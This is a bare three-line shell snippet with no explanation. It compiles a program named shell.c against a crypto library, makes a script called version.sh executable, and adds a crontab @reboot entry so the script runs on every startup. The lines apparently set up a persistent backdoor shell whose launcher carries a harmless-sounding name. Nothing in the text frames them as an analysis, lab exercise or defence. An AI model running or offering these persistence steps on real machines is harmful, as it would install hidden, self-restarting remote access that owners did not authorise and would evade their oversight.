gcc -o shell shell.c -lcrypto
chmod +x version.sh
(crontab -l ; echo "@reboot /home/$USER/version.sh") | crontab -
